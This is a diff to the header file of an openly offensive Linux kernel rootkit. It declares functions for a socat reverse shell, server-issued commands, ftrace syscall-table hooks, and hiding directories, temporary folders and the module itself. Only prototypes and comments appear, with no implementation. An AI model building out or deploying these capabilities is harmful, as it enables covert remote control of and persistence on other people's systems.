@@ -112,19 +112,24 @@ int launch_reverse_shell(void);								// Launch the reverse shell with socat
 // rootkit_command.c
 int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server
 
-//ftrace.c
+// ftrace.c
 extern int fh_install_hooks
 	(struct ftrace_hook *hooks, size_t count);				// Install hooks in the syscall table
 extern void fh_remove_hooks
 	(struct ftrace_hook *hooks, size_t count);				// Remove hooks from the syscall table
 
 // hooks.c
-int add_hidden_dir(const char *dirname);
-int remove_hidden_dir(const char *dirname);
-int is_hidden(const char *name);
+int add_hidden_dir(const char *dirname);					// Add a directory to the hidden list
+int remove_hidden_dir(const char *dirname);				    // Remove a directory from the hidden list
+int is_hidden(const char *name); 							// Check if a directory is hidden
+int list_hidden_dirs(char *buf, size_t buf_size); 			// List hidden directories
 
 // hider.c
 int hide_module(void);										// Hide the module from the kernel
 int unhide_module(void);									// Unhide the module in the kernel
+
+// fs.c
+int create_hidden_tmp_dir(void);							// Create a hidden temporary directory
+int remove_hidden_tmp_dir(void);							// Remove the hidden temporary directory
 
 #endif // EPIROOTKIT_H
